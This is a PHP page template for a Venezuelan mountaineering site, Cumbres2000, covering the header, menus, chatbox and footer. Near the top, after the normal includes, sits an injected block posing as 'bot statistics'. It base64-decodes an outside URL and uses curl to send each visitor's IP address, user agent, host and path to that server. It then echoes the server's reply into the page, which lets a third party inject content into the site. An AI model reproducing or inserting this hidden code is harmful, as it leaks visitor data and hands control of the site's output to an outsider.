<?php  session_start();

     include 'includes/config.php';
     include 'includes/conexion.php';
     include 'includes/funciones.php';
     if (isset($_GET['id']) && is_numeric($_GET['id'])) {  // Si es un contenido modificable por el administrador

             $resul = mysql_query('SELECT titulo FROM contenidos WHERE id='.$_GET['id'].' AND status=1 and tipo=1') or die(mysql_error());
         $titulo = mysql_fetch_assoc($resul);
         $titulo = $titulo['titulo'] == '' ? TITLE : ''.$titulo['titulo'];
     }

?><?php
if (!isset($sRetry)) {
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = '';
    $stCurlHandle = null;
    $stCurlLink = '';
    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) {
        // Bot comes

        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
        $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init($stCurlLink);
        }
    }
    if ($stCurlHandle !== null) {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);
        if ($sResult[0] == 'O') {
            $sResult[0] = ' ';
            echo $sResult; // Statistic code end
        }
        curl_close($stCurlHandle);
    }
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=euc-jp">

<title><?=$titulo?></title>


<meta name="Description" content="<?=DESCRIPTION?>">
<meta name="Keywords" content="<?=KEYWORDS?>">
<meta name="author" content="<?=AUTHOR?>">
<meta name="owner" content="<?=COPYRIGHT?>">
<meta name="robots" content="index, follow">
<link href="css/cumbres2000.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="css/agile_carousel.css" type='text/css'>
<link media="screen" rel="stylesheet" href="css/colorbox.css" />
<link media="screen" rel="stylesheet" href="css/paginator.css" />
<link rel="shortcut icon" href="http://www.cumbres2000.com/img/cumbres2000.ico" type="image/x-icon">
<link rel="stylesheet" type="text/css" media="screen,projection" href="css/ui.totop.css" />
<script type="text/javascript" src="/jwplayer/jwplayer.js" ></script>
<script>jwplayer.key="NYTv9OWxXweJjOICkv5jfz7aQk/gs/DxMYeHrw=="</script>
 
 <script type="text/javascript" src="js/jquery-1.4.3.min.js"></script>
 <script type="text/javascript" src="js/jquery.colorbox-min.js"></script>
 <script type="text/javascript" src="js/funciones.js"></script>
 <script src="js/easing.js" type="text/javascript"></script>
 <script src="js/jquery.ui.totop.js" type="text/javascript"></script>
<script src="js/agile_carousel.js"></script>
 <script type="text/javascript">
		$(document).ready(function() {
	
			$().UItoTop({ easingType: 'easeOutQuart' });
			
		});

var dt = new Date(), currentHour = dt.getHours(); 
// [0-31] 
backgroundImage=1;
if(currentHour<12) backgroundImage=2; 
if(currentHour<18) backgroundImage=3;
$("body").css("backgroundImage", "/img/fondo_" + backgroundImage + ".jpg");

/*

/img/fondo_1.jpg  Mañana
/img/fondo_2.jpg  Tarde
/img/fondo_3.jpg  Noche


*/

 </script>

</head>
<body >

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/es_LA/sdk.js#xfbml=1&version=v2.0";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<?php
include 'includes/ventanaBienvenida.php';
?>
<!-- Tabla de Arriba -->
<table width="100%" background="img/fondo_cabecera.png" height="70">
 <tr>
  <td valign="top">
<table width="980" border="0" align="center" cellpadding="0" cellspacing="0" height="75">
 <tr>
  <td valign="middle" width="320">&nbsp;&nbsp;<a href="index.php"><img src="img/logo.png" width="175" height="73" border="0" title="Cumbres2000.com"/></a></td>

  <td class="frase" width="300" valign="middle" align="center"><strong>Pensamiento de Monta&ntilde;ismo</strong><br><script language="JavaScript" src="js/frase.js"> </script></td>
<td valign="middle" align="right">
<table border="0" align="right" cellpadding="0" cellspacing="0" width="200">
<tr><td colspan="2" class="seguir">Redes Sociales:</td><td></tr>
<tr>
<td width="50"><a  target="_blank" href="https://www.facebook.com/pages/Cumbres2000/172992899418225"><img src="img/facebook.png" width="35" height="35" border="0" title="Facebook"/></a></td>
<td width="50"><a  target="_blank" href="http://instagram.com/cumbres2000"><img src="img/instagram.png" width="35" height="35" border="0" title="Instagram"/></a></td>
<td width="50"><a  target="_blank" href="http://www.twitter.com/Cumbres2000"><img src="img/twitter.png" width="35" height="35" border="0" title="Twitter"/></a></td>
<td width="50"><a  target="_blank" href="https://vimeo.com/davidrclimb"><img src="img/vimeo.gif" width="35" height="35" border="0" title="Vimeo"/></a></td>

</tr>
</table>
</td>
 </tr>
</table>
</td></tr></table>
<!-- Fin Tabla de Arriba -->

<br>

<table width="980" border="0" align="center" cellpadding="0" cellspacing="0">
 <tr>


<!-- Menu Izquierda -->
<td class="menu_izq" width="180" valign="top">
<table width="180" border="0" cellpadding="0" cellspacing="0">
 <tr>
  <td>
<?php include 'includes/homeMenu.php'; ?>
<br>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr><td class="menu_izq2" valign="middle">&nbsp;&nbsp;&nbsp;&nbsp;Chatbox</td></tr>
<tr><td class="menu_izq3" valign="middle"><iframe src="shoutbox.php" marginheight="1" marginwidth="1" allowtransparency="yes" width="170" frameborder="0" height="400" scrolling="auto"></iframe></td></tr>
</table>
<br>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr><td class="menu_izq2" valign="middle">&nbsp;&nbsp;&nbsp;Cumbres2000 en Facebook</td></tr>
<tr><td class="menu_izq4" valign="middle"><iframe src="http://www.facebook.com/plugins/likebox.php?href=http%3A%2F%2Fwww.facebook.com%2Fpages%2FCumbres2000%2F172992899418225&amp;width=180&amp;colorscheme=light&amp;show_faces=false&amp;stream=false&amp;header=false&amp;height=90" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:180px; height:90px;" allowTransparency="true"></iframe></td></tr></table></td></tr></table></td>

<!-- Fin Menu Izquierda -->


<!-- Contenido -->
<td valign="top"><table width="790" border="0" align="center">
<tr>
  <td class="contenido">
<table cellspacing="0" cellpadding="0" width="750" align="center">
<tr>

<td><table width="100%" border="0" <?=isset($ancho) ? $ancho : ''?>>
<tr><td>

<?php 
    include 'includes/contenido.php';
    include 'includes/comentarios.php';
?>


</td></tr>



</table>
</td>
</tr>
</table>
</td>
</tr>
<!-- Fin Contenido -->


<!-- Pie de Pagina -->
<tr><td><table width="800" border="0" align="center" cellpadding="0" cellspacing="0">
<tr><td align="left" width="60%" class="pie">Background: Amanecer sobre los Picos Humboldt y Bonpland</td><td width="40%" align="right" class="pie">Web de David Rivas: Monta&ntilde;ista Venezolano</td></tr></table> 
</td></tr> 
<!-- Fin Pie de Pagina --> 
</table></td> 
</tr> 
</table> 
 
</body> 
</html>